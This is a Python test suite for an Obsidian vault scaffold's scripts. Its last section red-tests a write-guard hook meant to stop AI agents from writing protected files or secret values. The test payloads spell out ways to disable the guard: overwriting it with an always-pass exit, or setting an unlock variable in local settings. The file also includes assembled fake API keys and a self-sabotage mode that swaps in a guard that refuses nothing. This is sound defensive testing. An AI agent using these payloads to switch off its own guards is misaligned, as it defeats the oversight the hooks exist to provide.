    r = subprocess.run([PY, str(sp), str(v36b / "04 Inner World/Notes/scan.md")] + STAMP
                       + ["--capture", str(v36b / "01 Inbox/Scanner Inbox/scan.pdf")],
                       capture_output=True, text=True)
    if r.returncode != 0:
        fails.append("stamp-processed/capture-clean-control: rejected a good capture, so its reds are meaningless: "
                     + (r.stderr.strip().splitlines() or ["?"])[-1])
    elif (v36b / "01 Inbox/Scanner Inbox/scan.pdf").exists():
        fails.append("stamp-processed/capture-clean-control: stamped but left the original in 01 Inbox")
    elif not (v36b / "05 Assets/Documents/scan.pdf").is_file():
        fails.append("stamp-processed/capture-clean-control: the shelf copy is gone")
    elif "processed: true" not in (v36b / "04 Inner World/Notes/scan.md").read_text():
        fails.append("stamp-processed/capture-clean-control: original removed but the wrapper is not stamped")

    # 37-42. new-entity.py must refuse every shape that produces a note the
    #     rest of the scaffold would then have to repair: an unknown type, a
    #     title GL-1004 forbids, a note already there, a link to nothing, a
    #     `note` filed under nothing (GL-1007), a required field left empty.
    ne = HERE / "new-entity.py"
    ent = fixture_vault(tmp, "entity-vault")
    seed(ent, "topic", "Knowledge Management", "04 Inner World/My Life/Topics")
    # Case 43b follows [[Alex]] to Alex Rivera, so the alias is part of the
    # fixture rather than something the member's vault happens to have.
    seed(ent, "person", "Alex Rivera", "04 Inner World/Contacts/People",
         name="Alex Rivera", aliases="[Alex]")
    R = ["--root", str(ent)]
    KM = ["--link", "[[Knowledge Management]]", "--set", "note_type=outline"]
    expect_refusal("new-entity/unknown-type", [str(ne), "widget", "A Thing"] + R)
    expect_refusal("new-entity/bad-title",
                   [str(ne), "topic", "Bad/Title"] + R)
    expect_refusal("new-entity/note-without-link",
                   [str(ne), "note", "Unfiled Note", "--set", "note_type=outline"] + R)
    expect_refusal("new-entity/link-to-nothing",
                   [str(ne), "note", "Unfiled Note", "--link", "[[Nowhere At All]]",
                    "--set", "note_type=outline"] + R)
    expect_refusal("new-entity/missing-required-field",
                   [str(ne), "note", "Unfiled Note",
                    "--link", "[[Knowledge Management]]"] + R)
    expect_refusal("new-entity/invented-field",
                   [str(ne), "note", "Unfiled Note", "--set", "colour=blue"] + KM + R)
    expect_refusal("new-entity/value-outside-the-enum",
                   [str(ne), "note", "Unfiled Note", "--link",
                    "[[Knowledge Management]]", "--set", "note_type=Outline"] + R)
    expect_refusal("new-entity/project-without-a-goal",
                   [str(ne), "project", "Goalless"] + R)
    # 42b. the control: a good creation must PASS and must land a note that
    #      validate-scaffold and check-bases both still accept, or the reds
    #      above prove only that the script refuses everything.
    checks += 1
    r = subprocess.run([PY, str(ne), "note", "Filed Note"] + KM + R,
                       capture_output=True, text=True)
    made = ent / "04 Inner World/Notes/Filed Note.md"
    if r.returncode != 0:
        fails.append("new-entity/clean-control: refused a good note, so its reds "
                     "are meaningless: " + (r.stderr.strip().splitlines() or ["?"])[-1])
    elif not made.is_file():
        fails.append("new-entity/clean-control: reported OK but wrote no note")
    elif '"[[Knowledge Management]]"' not in made.read_text():
        fails.append("new-entity/clean-control: the note was created without its link")
    else:
        v = subprocess.run([PY, str(HERE / "validate-scaffold.py"), str(ent)],
                           capture_output=True, text=True)
        if v.returncode != 0:
            fails.append("new-entity/clean-control: the note it created fails "
                         "validate-scaffold: "
                         + (v.stderr.strip().splitlines() or ["?"])[-1])
    # 43. and the note it just made must now be FOUND by find-entity.py, which
    #     is the duplicate check SOP-1004 runs before creating anything. A
    #     find-entity that returns "none" for a note that exists is how one
    #     thing gets two notes.
    checks += 1
    fe = HERE / "find-entity.py"
    r = subprocess.run([PY, str(fe), "Filed Note"] + R, capture_output=True, text=True)
    if r.returncode != 0:
        fails.append("find-entity/duplicate-found: did not find a note that exists "
                     f"(exit {r.returncode}), so the duplicate check passes a duplicate")
    else:
        try:
            if _json.loads(r.stdout)["count"] < 1:
                fails.append("find-entity/duplicate-found: exit 0 with no hits")
        except Exception as e:
            fails.append(f"find-entity/duplicate-found: report unreadable ({e})")
    # 43b. an alias must resolve too: Obsidian follows [[Alex]] to Alex Rivera,
    #      and a duplicate check that only reads filenames misses exactly the
    #      duplicates a person makes.
    checks += 1
    r = subprocess.run([PY, str(fe), "Alex", "--type", "person"] + R,
                       capture_output=True, text=True)
    if r.returncode != 0:
        fails.append("find-entity/alias-found: an alias in `aliases` did not resolve")
    # 43c. its refusals
    expect_refusal("find-entity/no-name", [str(fe), "   "] + R)
    expect_refusal("find-entity/unknown-type", [str(fe), "Alex", "--type", "widget"] + R)
    expect_refusal("find-entity/not-a-scaffold", [str(fe), "Alex", "--root", str(tmp)])

    # 44-47. check-quality.py must SEE what it exists to see. A quality
    #     script that reports `ok` on a vault built to be broken is the worst
    #     shape of all: a green that means nothing. One deliberately broken
    #     vault, four metrics that must fire.
    cq = HERE / "check-quality.py"
    expect_refusal("check-quality/not-a-scaffold", [str(cq), str(tmp)])
    bad_q = fixture_vault(tmp, "quality-vault")
    seed(bad_q, "topic", "Knowledge Management", "04 Inner World/My Life/Topics")
    # The duplicate the check must find needs BOTH halves in the fixture: the
    # person note and the one whose `name` normalises to the same identity.
    seed(bad_q, "person", "Alex Rivera", "04 Inner World/Contacts/People",
         name="Alex Rivera")
    (bad_q / "04 Inner World/Notes/Loose Note.md").write_text(
        "---\ntype: note\nnote_type: outline\ncreated: 2026-09-01\n"
        'topics: ["[[Knowledge Management]]"]\ncolour: blue\ntags: []\n---\n\n'
        "# Loose Note\n\nPoints at [[Nowhere At All]].\n", encoding="utf-8")
    (bad_q / "04 Inner World/Contacts/People/A Rivera.md").write_text(
        "---\ntype: person\nname: Alex Rivera\ncreated: 2026-09-01\ntags: []\n---\n\n"
        "# A Rivera\n", encoding="utf-8")
    old_capture = bad_q / "01 Inbox/Outer World/an-old-clip.md"
    long_ago = (_dt.date.today() - _dt.timedelta(days=90)).isoformat()
    old_capture.write_text(
        f"---\ntype: capture\nsource_url: https://example.com\n"
        f"captured: {long_ago}T09:00:00Z\n---\n\nclipped\n", encoding="utf-8")
    checks += 1
    r = subprocess.run([PY, str(cq), str(bad_q), "--json"], capture_output=True, text=True)
    try:
        rep = _json.loads(r.stdout)
        by_id = {m["id"]: m for m in rep["metrics"]}
        for mid in ("invented_fields", "dangling_links", "duplicate_entities"):
            if by_id[mid]["value"] < 1:
                fails.append(f"check-quality/{mid}: the broken vault carries one "
                             f"and the metric reads {by_id[mid]['value']}")
        if by_id["unprocessed_capture_oldest_days"]["severity"] != "broken":
            fails.append("check-quality/old-capture: a capture 90 days old is "
                         f"{by_id['unprocessed_capture_oldest_days']['severity']}, "
                         "not broken; the threshold does not fire")
        if rep["health"] != "broken":
            fails.append(f"check-quality/health: the broken vault reads {rep['health']}")
        if rep["schema"] != 1:
            fails.append("check-quality/schema: the plugin contract is schema 1, "
                         f"got {rep['schema']}")
    except Exception as e:
        fails.append(f"check-quality: report unreadable ({e}): {r.stderr.strip()[:200]}")
    # 47a. A DECLARED TYPE THAT IS NOT A GL-1002 TYPE MUST BE A NAMED
    #      FINDING (pilot A finding F8). Silas seeded the pilot scratchpad
    #      with `type: daily`, which is not in the guideline. `note_type()`
    #      trusts a declared type over the room, so the note left the
    #      unprocessed queue with `processed: false` still on it, and the
    #      report said `Enum violations 0`, `Invented fields 0`,
    #      `Unprocessed scratchpads 0`. Three zeros, all of them wrong, and
    #      nothing anywhere said the type was not a type.
    (bad_q / "00 Daily Scratchpad" / "2026" / "09").mkdir(parents=True, exist_ok=True)
    (bad_q / "00 Daily Scratchpad" / "2026" / "09" / "2026-09-14.md").write_text(
        "---\ntype: daily\ndate: 2026-09-14\nprocessed: false\n---\n"
        "bought milk\n", encoding="utf-8")
    checks += 1
    r = subprocess.run([PY, str(cq), str(bad_q), "--json"], capture_output=True, text=True)
    try:
        rep2 = _json.loads(r.stdout)
        by2 = {m["id"]: m for m in rep2["metrics"]}
        checks += 1
        if by2["enum_violations"]["value"] < 1:
            fails.append("check-quality/type-out-of-enum: `type: daily` is not a "
                         "GL-1002 type and enum_violations reads %d"
                         % by2["enum_violations"]["value"])
        checks += 1
        hit = [f for f in rep2["findings"]
               if f["path"].startswith("00 Daily Scratchpad/")
               and "daily" in f["message"]]
        if not hit:
            fails.append("check-quality/type-out-of-enum: no finding names the "
                         "scratchpad whose declared type is not a type")
        elif "scratchpad" not in hit[0]["message"] + hit[0]["action"]:
            fails.append("check-quality/type-out-of-enum: the finding does not name "
                         "the allowed values, so the reader cannot act on it: %r"
                         % hit[0]["message"])
        checks += 1
        if by2["unprocessed_scratchpads"]["value"] < 1:
            fails.append("check-quality/type-out-of-enum: the note carries "
                         "`processed: false` in the scratchpad room and the queue "
                         "reads %d; a wrong type must not empty the queue"
                         % by2["unprocessed_scratchpads"]["value"])
    except Exception as e:
        fails.append("check-quality/type-out-of-enum: report unreadable (%s): %s"
                     % (e, r.stderr.strip()[:200]))

    # 47c. A BLANK DAILY NOTE IS NOT AN UNPROCESSED ONE (Brian Carroll,
    #      T16-5). link-dates-to-daily-notes.py --fix creates the daily note
    #      for every day a link points at, empty and on purpose, so a member
    #      who linked forty dates woke up to forty "unprocessed scratchpads"
    #      and an oldest-unprocessed age measured from a note nobody had
    #      written in. Both halves: the blank one must NOT count, the one
    #      with a line in it must.
    (bad_q / "00 Daily Scratchpad/2026/09").mkdir(parents=True, exist_ok=True)
    (bad_q / "00 Daily Scratchpad/2026/09/2026-09-01.md").write_text("", encoding="utf-8")
    (bad_q / "00 Daily Scratchpad/2026/09/2026-09-02.md").write_text("   \n\n",
                                                                    encoding="utf-8")
    (bad_q / "00 Daily Scratchpad/2026/09/2026-09-03.md").write_text(
        "bought milk\n", encoding="utf-8")

    # 47d. CODE IS NOT PROSE (Brian Carroll, T16-7). A wikilink inside a
    #      fence or an inline span is an EXAMPLE of a link, which is what
    #      every guideline that teaches wikilinks is full of.
    (bad_q / "04 Inner World/Notes/Teaches Links.md").write_text(
        "---\ntype: note\nnote_type: outline\ncreated: 2026-09-01\n"
        'topics: ["[[Knowledge Management]]"]\ntags: []\n---\n\n'
        "# Teaches Links\n\nWrite it as `[[Inline Example]]`, like this:\n\n"
        "```\n[[Fenced Example]]\n```\n", encoding="utf-8")

    # 47e. THE RESOLVER (Brian Carroll, T16-6). Two notes answer to the stem
    #      `Ledger`; Obsidian resolves to the shorter path, and so must this.
    #      And a link written to an `aliases` entry resolves, because an
    #      alias exists to be linked to.
    (bad_q / "04 Inner World/Notes/Ledger.md").write_text(
        "---\ntype: note\nnote_type: outline\ncreated: 2026-09-01\n"
        'topics: ["[[Knowledge Management]]"]\naliases: ["The Big Ledger"]\n'
        "tags: []\n---\n\n# Ledger\n", encoding="utf-8")
    deep = bad_q / "04 Inner World/Notes/deep/deeper/Ledger.md"
    deep.parent.mkdir(parents=True, exist_ok=True)
    deep.write_text("---\ntype: note\nnote_type: outline\ncreated: 2026-09-01\n"
                    'topics: ["[[Knowledge Management]]"]\ntags: []\n---\n\n'
                    "# Ledger\n", encoding="utf-8")
    (bad_q / "04 Inner World/Notes/Points At Both.md").write_text(
        "---\ntype: note\nnote_type: outline\ncreated: 2026-09-01\n"
        'topics: ["[[Knowledge Management]]"]\ntags: []\n---\n\n'
        "# Points At Both\n\nSee [[Ledger]] and [[The Big Ledger]].\n",
        encoding="utf-8")

    r = subprocess.run([PY, str(cq), str(bad_q), "--json"], capture_output=True, text=True)
    try:
        rep3 = _json.loads(r.stdout)
        by3 = {m["id"]: m for m in rep3["metrics"]}
        blank_hits = [f for f in rep3["findings"]
                      if f["metric"] == "unprocessed_scratchpads"
                      and ("2026-09-01" in f["path"] or "2026-09-02" in f["path"])]
        checks += 1
        if blank_hits:
            fails.append("check-quality/blank-daily-note: a blank daily note is "
                         "reported as an unprocessed scratchpad: %s"
                         % ", ".join(sorted(f["path"] for f in blank_hits)))
        checks += 1
        if not [f for f in rep3["findings"]
                if f["metric"] == "unprocessed_scratchpads"
                and "2026-09-03" in f["path"]]:
            fails.append("check-quality/blank-daily-note: skipping the blank ones "
                         "also silenced the scratchpad that HAS a line in it")
        checks += 1
        code_hits = [f for f in rep3["findings"]
                     if f["metric"] == "dangling_links"
                     and ("Inline Example" in f["message"]
                          or "Fenced Example" in f["message"])]
        if code_hits:
            fails.append("check-quality/links-in-code: a wikilink inside a code "
                         "fence or an inline span is counted as a link: %s"
                         % "; ".join(f["message"] for f in code_hits))
        checks += 1
        alias_hits = [f for f in rep3["findings"]
                      if f["metric"] == "dangling_links"
                      and "The Big Ledger" in f["message"]]
        if alias_hits:
            fails.append("check-quality/alias-resolves: a link written to an "
                         "`aliases` entry is reported as dangling")
        checks += 1
        orphan_hits = [f for f in rep3["findings"] if f["metric"] == "orphans"
                       and f["path"] == "04 Inner World/Notes/Ledger.md"]
        if orphan_hits:
            fails.append("check-quality/shortest-path-wins: [[Ledger]] resolved to "
                         "the deeper of the two, so the one nearer the top of the "
                         "vault reads as an orphan; Obsidian takes the shortest path")
        checks += 1
        if by3["dangling_links"]["value"] < 1:
            fails.append("check-quality/dangling-still-fires: the fixture still "
                         "carries [[Nowhere At All]] and the metric reads 0; the "
                         "code and alias fixes must not blind the check")
    except Exception as e:
        fails.append("check-quality/resolver-and-code: report unreadable (%s): %s"
                     % (e, r.stderr.strip()[:200]))

    # 47b. THE CLEAN CONTROL, ON A FIXTURE RATHER THAN ON THE MEMBER'S VAULT
    #      (Brian Carroll T16-15, Andrew Gillley T13-4). It used to measure
    #      ROOT and demand `ok`, which is a statement about the member's life,
    #      not about this script: a lived-in vault with one invented field in
    #      it turned the whole red suite red. The control is now a vault this
    #      file built, with real notes in it and every count known, and the
    #      live vault's health is printed as a NOTE and decides nothing.
    good_q = fixture_vault(tmp, "quality-clean")
    seed(good_q, "topic", "Knowledge Management", "04 Inner World/My Life/Topics")
    (good_q / "04 Inner World/Notes/Clean Note.md").write_text(
        "---\ntype: note\nnote_type: outline\ncreated: 2026-09-01\n"
        'topics: ["[[Knowledge Management]]"]\ntags: []\n---\n\n'
        "# Clean Note\n\nAbout [[Knowledge Management]].\n", encoding="utf-8")
    # The Topic links back, because an unlinked note is an orphan and an
    # orphan is `attention`. A clean control has to be clean by the rules the
    # script actually applies, not by the ones the author remembers.
    km = good_q / "04 Inner World/My Life/Topics/Knowledge Management.md"
    km.write_text(km.read_text(encoding="utf-8").rstrip("\n")
                  + "\n\nSee [[Clean Note]].\n", encoding="utf-8")
    checks += 1
    r = subprocess.run([PY, str(cq), str(good_q), "--json"], capture_output=True, text=True)
    try:
        clean = _json.loads(r.stdout)
        if clean["health"] != "ok":
            fails.append("check-quality/clean-control: a vault this file built "
                         "from Templates/, with nothing wrong in it, does not read "
                         "ok (%s); the metrics cannot be trusted when they fire: %s"
                         % (clean["health"],
                            "; ".join("%s=%s" % (m["id"], m["value"])
                                      for m in clean["metrics"]
                                      if m["severity"] != "ok")))
        checks += 1
        if sum(m["value"] for m in clean["metrics"]) != 0 or not clean.get("counts", clean):
            pass
        # The control must be measuring something. A vault with no notes in it
        # reads ok for the same reason an empty folder does.
        if len(list((good_q / "04 Inner World").rglob("*.md"))) < 2:
            fails.append("check-quality/clean-control: the control vault holds "
                         "fewer than two notes, so `ok` says nothing")
    except Exception as e:
        fails.append(f"check-quality/clean-control: report unreadable ({e})")

    # The live vault, for the operator, as information. Never a pass or a
    # fail: this suite tests the scripts, and a member's vault is not a script.
    r = subprocess.run([PY, str(cq), str(ROOT), "--json"], capture_output=True, text=True)
    try:
        print("NOTE live vault health (%s): %s" % (ROOT.name, _json.loads(r.stdout)["health"]))
    except Exception:
        print("NOTE live vault health: could not be read (this decides nothing)")

    # 48-51. validate-scaffold checks 12 and 13: the by-hand path in GL-1007
    #     tells the member to run Templates: Insert template and to fill the
    #     Properties panel. Both instructions are only true while templates.json
    #     points at the folder and types.json calls every list a list.
    vs = HERE / "validate-scaffold.py"
    tpl_bad = tmp / "templates-elsewhere"
    shutil.copytree(ROOT, tpl_bad, ignore=shutil.ignore_patterns(".git"))
    (tpl_bad / ".obsidian/templates.json").write_text('{"folder": "03 WiP"}\n')
    expect_fail("validate-scaffold/templates-json-elsewhere", [str(vs), str(tpl_bad)])
    tpl_gone = tmp / "template-missing"
    shutil.copytree(ROOT, tpl_gone, ignore=shutil.ignore_patterns(".git"))
    (tpl_gone / "06 AI Team/AI Team Knowledge/Templates/note.md").unlink()
    expect_fail("validate-scaffold/template-named-by-gl1002-missing", [str(vs), str(tpl_gone)])
    def types_vault(name, **edits):
        v = tmp / name
        shutil.copytree(ROOT, v, ignore=shutil.ignore_patterns(".git"))
        path = v / ".obsidian/types.json"
        cfg = _json.loads(path.read_text(encoding="utf-8"))
        cfg["types"].update(edits)
        path.write_text(_json.dumps(cfg, indent=2), encoding="utf-8")
        return v
    expect_fail("validate-scaffold/types-json-list-as-text",
                [str(vs), str(types_vault("types-text", topics="text"))])
    # 51b-51c. The three reserved property names run the other way.
    #     Obsidian's MetadataTypeManager owns `tags` and `aliases` and
    #     rewrites types.json with its own names on the first type change
    #     in the vault (Flint, 2026-09-09), so `multitext` there is a value
    #     that cannot survive contact with the app: shipping it would make
    #     check 13 go red in a member's vault for something the member did
    #     not do. Both must be red HERE, or the check would be enforcing a
    #     state Obsidian undoes. `cssclasses` is not renamed and stays
    #     multitext, which the shipped file and the clean controls cover.
    r = expect_fail("validate-scaffold/types-json-tags-as-multitext",
                    [str(vs), str(types_vault("types-tags", tags="multitext"))])
    checks += 1
    if r.returncode != 0 and "'tags'" not in (r.stderr or ""):
        fails.append("validate-scaffold/types-json-tags-as-multitext: went red, "
                     "but not for tags")
    expect_fail("validate-scaffold/types-json-aliases-as-multitext",
                [str(vs), str(types_vault("types-aliases", aliases="multitext"))])
    ty_gone = tmp / "types-missing"
    shutil.copytree(ROOT, ty_gone, ignore=shutil.ignore_patterns(".git"))
    (ty_gone / ".obsidian/types.json").unlink()
    expect_fail("validate-scaffold/types-json-missing", [str(vs), str(ty_gone)])

    # 52-55. GL-1011's date linker. Its own fixture suite (one case per rule
    #     it claims, every IGNORE case a date it must NOT touch) is run whole
    #     rather than restated here, and it carries --break-me so the suite
    #     itself is red-tested. The two refusals below are the ones a member's
    #     vault can actually hit: no daily-notes.json, and a daily-note format
    #     a [[YYYY-MM-DD]] link could never resolve to.
    linker = HERE / "link-dates-to-daily-notes.py"
    suite = HERE / "test-link-dates-to-daily-notes.py"
    checks += 1
    r = subprocess.run([PY, str(suite)], capture_output=True, text=True)
    if r.returncode != 0:
        fails.append("link-dates-to-daily-notes/fixture-suite: " + (r.stderr or "").strip())
    expect_fail("link-dates-to-daily-notes/suite-can-go-red", [str(suite), "--break-me"])
    no_cfg = tmp / "dates-no-config"
    shutil.copytree(ROOT, no_cfg, ignore=shutil.ignore_patterns(".git"))
    (no_cfg / ".obsidian/daily-notes.json").unlink()
    expect_refusal("link-dates-to-daily-notes/fix-without-daily-notes-json",
                   [str(linker), str(no_cfg), "--fix"])
    bad_fmt = tmp / "dates-bad-format"
    shutil.copytree(ROOT, bad_fmt, ignore=shutil.ignore_patterns(".git"))
    (bad_fmt / ".obsidian/daily-notes.json").write_text(
        '{"folder": "00 Daily Scratchpad", "format": "DD-MM-YYYY"}\n', encoding="utf-8")
    expect_refusal("link-dates-to-daily-notes/format-cannot-back-the-link",
                   [str(linker), str(bad_fmt), "--check"])

    # =====================================================================
    # 55a-55j. LINE ENDINGS ARE THE MEMBER'S (Ian Slattery, T15-A).
    #     Python's text mode is universal-newlines on the way in, so the
    #     ordinary read_text/write_text pair silently rewrote every line
    #     ending of every note these scripts touched: a CRLF note came back
    #     LF, a stray lone CR came back LF, and on Windows a freshly created
    #     note came out CRLF. Nothing looked wrong on macOS until the member
    #     opened the file in git or on Windows and read the whole file as
    #     changed. Every fixture here is written with write_bytes and read
    #     back with read_bytes, because a fixture written through text mode
    #     would be testing this platform rather than the script.
    # =====================================================================
    eolv = tmp / "eol-vault"
    (eolv / "01 Inbox" / "Outer World").mkdir(parents=True)
    BODIES = {
        "lf":    b"---\ntype: capture\n---\nline one\nline two\n",
        "crlf":  b"---\r\ntype: capture\r\n---\r\nline one\r\nline two\r\n",
        "stray": b"---\ntype: capture\n---\nline one\rstill line one\nline two\n",
    }
    for kind, raw in BODIES.items():
        note = eolv / "01 Inbox" / "Outer World" / ("%s.md" % kind)
        note.write_bytes(raw)
        body_before = raw.split(b"---", 2)[2]
        checks += 1
        r = subprocess.run([PY, str(HERE / "stamp-processed.py"), str(note),
                            "--summary", "carried", "--into", "[[y]]"],
                           capture_output=True, text=True)
        if r.returncode != 0:
            fails.append("noteio/stamp-%s: refused an ordinary note (%s)"
                         % (kind, (r.stderr or "").strip()[:120]))
            continue
        after = note.read_bytes()
        checks += 1
        if after.split(b"---", 2)[2] != body_before:
            fails.append("noteio/stamp-%s: the body bytes changed; the member's "
                         "line endings are not the script's to rewrite (%r -> %r)"
                         % (kind, body_before, after.split(b"---", 2)[2]))
        checks += 1
        want_eol = b"\r\n" if kind == "crlf" else b"\n"
        if b"processed: true" + want_eol not in after:
            fails.append("noteio/stamp-%s: the stamp it ADDED does not use the "
                         "note's own line ending" % kind)

    # 55g-55j. A note this scaffold CREATES carries no CR at all, whatever
    #     platform it was created on. LF is what the rest of the vault ships,
    #     and a mixed vault is the state git reports as "everything changed".
    made = []
    r = subprocess.run([PY, str(HERE / "new-journal-entry.py"), "--root", str(ent),
                        "--date", "2026-09-15", "--slug", "eol-probe",
                        "--journal-type", "thought",
                        "--original", "  indented line\n\nand a blank line above\n"],
                       capture_output=True, text=True)
    checks += 1
    jp = ent / "04 Inner World/Journal/2026/09/2026-09-15_eol-probe.md"
    if r.returncode != 0 or not jp.is_file():
        fails.append("noteio/journal-created: new-journal-entry.py refused an "
                     "ordinary entry: " + (r.stderr or "").strip()[:150])
    else:
        made.append(jp)
        # T16-4: the member's words land exactly as they were passed. The
        # Original Text section is the one section GL-1003 calls sacred, and
        # it used to be written through .strip().
        checks += 1
        if "  indented line\n\nand a blank line above\n" not in jp.read_text(encoding="utf-8"):
            fails.append("noteio/journal-original-verbatim: the entry does not "
                         "carry --original exactly as it was passed; leading or "
                         "trailing whitespace was eaten")
    for path in made:
        checks += 1
        if b"\r" in path.read_bytes():
            fails.append("noteio/created-note-has-no-cr: %s carries a carriage "
                         "return; a note this scaffold creates ships LF"
                         % path.name)

    # =====================================================================
    # 55k. THE KEYBOARD CONVENTION (Ian Slattery, T11-4). Every key in the
    #      member-facing docs was written the Mac way and nothing anywhere
    #      said what a Windows member should press, across four files and
    #      about fifteen mentions. The convention Tom set: spell the Windows
    #      key out on the FIRST mention in a document, short form after that,
    #      plus one line in GL-1010's key table.
    #
    #      The scan is the scaffold's OWN documents, never the member's notes:
    #      a member who writes `Cmd+K` in a note of their own is not a defect
    #      in this repo, and a suite that goes red for their writing is the
    #      mistake T16-15 was about. Outside the scaffold checkout it is a
    #      skip, by name, with the reason.
    KEY_DOCS = sorted(
        [ROOT / "README.md"]
        + [p for p in ROOT.glob("*/README.md")]
        + [p for p in ROOT.glob("04 Inner World/*/README.md")]
        + [p for p in (ROOT / "06 AI Team/AI Team Knowledge/Guidelines").glob("*.md")]
        + [p for p in (ROOT / "06 AI Team/AI Team Knowledge/SOPs").glob("*.md")]
        + [p for p in (ROOT / "06 AI Team/AI Team Knowledge/Workstreams").glob("*.md")])
    KEY_DOCS = [p for p in KEY_DOCS if p.is_file()]
    _FENCE = re.compile(r"(?ms)^[ \t]*(`{3,}|~{3,}).*?(?:^[ \t]*\1[^\n]*$|\Z)")
    if GIT_SKIP:
        skip("docs/windows-key-on-first-use",
             "%s; this scan is about the scaffold's own documents, not the "
             "member's notes" % GIT_SKIP)
    else:
        checks += 1
        bare = []
        for doc in KEY_DOCS:
            text = doc.read_text(encoding="utf-8", errors="ignore")
            # Code and diagram fences are not prose. A `Cmd+O` inside a mermaid
            # node label is a picture of a key, and a label is no place to put
            # a parenthetical.
            prose = _FENCE.sub(lambda m: "".join(
                c if c == "\n" else " " for c in m.group(0)), text)
            hit = re.search(r"Cmd\s*\+", prose)
            if not hit:
                continue
            # A window either side of the key, because the convention reads
            # just as well stated before it ("The keys (`Cmd` is `Ctrl` on
            # Windows): `Cmd+Alt+S` ...") as after it.
            window = prose[max(0, hit.start() - 160):hit.start() + 160]
            if "Ctrl" not in window:
                bare.append("%s:%d" % (doc.relative_to(ROOT).as_posix(),
                                       prose[:hit.start()].count("\n") + 1))
        if bare:
            fails.append("docs/windows-key-on-first-use: the first key named in "
                         "these documents is Mac-only and nothing beside it says "
                         "what a Windows member presses: %s. The convention is "
                         "`Cmd+N (Ctrl+N on Windows)` on first use, short form "
                         "after that (GL-1010, The keys)" % ", ".join(bare))

    # =====================================================================
    # 56+. The hook guards (2026-09-14). Every rule in
    #      Scripts/hooks-rules.json gets a case that must be refused AND a
    #      clean control that must pass, because a guard that refuses
    #      everything proves as little as one that refuses nothing.
    # =====================================================================
    import json as _j, os as _o, re as _r

    WG = HERE / "write-guard.py"
    if SELF_SABOTAGE:
        # A guard that refuses nothing. Every `wg(..., 2)` case below must now
        # go red, which is the whole point of the run that sets this.
        WG = tmp / "sabotaged-write-guard.py"
        WG.write_text("import sys\nsys.stdin.read()\nraise SystemExit(0)\n")

    def wg(name, tool_input, expect, tool="Write", unlock=False, raw=None,
           root=None):
        """Run write-guard.py the way a host does: JSON on stdin.
        expect 2 = must block, 0 = must let it through.

        `root` is for the cases that need a file ON DISK beside the path they
        are about (the hiring marker). Everything else runs against this tree,
        which the guard never writes to."""
        global checks
        checks += 1
        base = str(root or ROOT)
        env = dict(_o.environ)
        env["CLAUDE_PROJECT_DIR"] = base
        env.pop("ICOR_UNLOCK_WRITES", None)
        if unlock:
            env["ICOR_UNLOCK_WRITES"] = "1"
        payload = raw if raw is not None else _j.dumps({
            "session_id": "red-test", "cwd": base,
            "hook_event_name": "PreToolUse", "tool_name": tool,
            "tool_input": tool_input})
        r = subprocess.run([PY, str(WG)], input=payload, capture_output=True,
                           text=True, env=env)
        if r.returncode != expect:
            fails.append("write-guard/%s: exit %d, expected %d%s"
                         % (name, r.returncode, expect,
                            (" (" + (r.stderr or "").strip()[:160] + ")") if r.stderr else ""))
        if "Traceback" in (r.stderr or ""):
            fails.append("write-guard/%s: crashed instead of answering" % name)
        return r

    A = str(ROOT)
    # 56-59. the protected paths, each one blocked
    wg("scratchpad", {"file_path": A + "/00 Daily Scratchpad/2026-09-14.md",
                      "content": "rewritten by an agent\n"}, 2)
    wg("root-agents-md", {"file_path": A + "/AGENTS.md", "content": "x\n"}, 2)
    wg("root-claude-md", {"file_path": A + "/CLAUDE.md", "content": "x\n"}, 2)
    wg("specialist-contract",
       {"file_path": A + "/06 AI Team/Agents/Penn/AGENT.md", "content": "x\n"}, 2)
    # 60. the unlock, red-tested like every other lever. An unlock nobody
    #     proved is a promise, and the first real block would then be
    #     answered by deleting the guard.
    wg("unlock-lets-it-through",
       {"file_path": A + "/00 Daily Scratchpad/2026-09-14.md", "content": "x\n"},
       0, unlock=True)
    # 61. the clean control: an ordinary note must pass, or every red above
    #     is just a script that always says no.
    wg("ordinary-write-control",
       {"file_path": A + "/04 Inner World/Notes/a-note.md",
        "content": "# A note\n\nNothing secret here.\n"}, 0)
    # 62-63. a secret VALUE blocks, on the Write payload and on an Edit
    #     payload, which names its content field differently. The guard
    #     walks the tool input rather than naming fields, and this is the
    #     case that proves it.
    #     The fake keys are ASSEMBLED rather than written, so no
    #     secret-shaped literal exists in this file for a scanner to find.
    fake_anthropic = "sk-" + "ant-" + "api03-" + "Zq7mR4tLbN9vWx2Kd8Fj3Hs6Pc1Ay5Ge0T"
    fake_generic = "LEXWARE_API_" + "TOKEN=" + "Hn4Rp8Wq2Lv6Ty9Zx3Mk7Bd5Cf1Ga0Js"
    wg("secret-value", {"file_path": A + "/04 Inner World/Notes/wiring.md",
                        "content": "key: " + fake_anthropic + "\n"}, 2)
    wg("secret-value-edit-payload",
       {"file_path": A + "/04 Inner World/Notes/wiring.md",
        "old_string": "TBD", "new_string": fake_generic}, 2, tool="Edit")
    # 64. the secret deny lifts on the same unlock
    wg("secret-unlock", {"file_path": A + "/04 Inner World/Notes/wiring.md",
                         "content": fake_anthropic}, 0, unlock=True)
    # 65-66. two clean controls the guard must NOT fire on, or no guideline
    #     could ever document a key shape and no note could name a variable.
    wg("placeholder-control",
       {"file_path": A + "/04 Inner World/Notes/wiring.md",
        "content": "set ANTHROPIC_API_KEY=your-key-here in .env\n"}, 0)
    wg("variable-name-control",
       {"file_path": A + "/04 Inner World/Notes/wiring.md",
        "content": "The name is ANTHROPIC_API_KEY and the value lives in .env.\n"}, 0)
    # 66a-66f. the guard layer's own wiring (Vex gate 2026-09-14, V-06).
    #     Every one of these was an ordinary file here until today, and each is
    #     a way to stand the whole layer down: one `env` key in
    #     settings.local.json sets ICOR_UNLOCK_WRITES for every later session,
    #     and one edit to a guard removes the rule outright. This remains a
    #     friction gate -- a shell reaches all of it -- and what it closes is
    #     an agent "fixing" a block by editing the block.
    wg("wiring-settings-json", {"file_path": A + "/.claude/settings.json",
                                "content": "{}\n"}, 2)
    wg("wiring-settings-local-json",
       {"file_path": A + "/.claude/settings.local.json",
        "content": '{"env": {"ICOR_UNLOCK_WRITES": "1"}}\n'}, 2)
    wg("wiring-hook-script", {"file_path": A + "/.claude/hooks/write-guard.py",
                              "content": "raise SystemExit(0)\n"}, 2)
    wg("wiring-hooks-rules-json",
       {"file_path": A + "/06 AI Team/AI Team Knowledge/Scripts/hooks-rules.json",
        "content": "{}\n"}, 2)
    wg("wiring-registered-guard",
       {"file_path": A + "/06 AI Team/AI Team Knowledge/Scripts/write-guard.py",
        "content": "raise SystemExit(0)\n"}, 2)
    # The unlock still lifts it, like every other protected path.
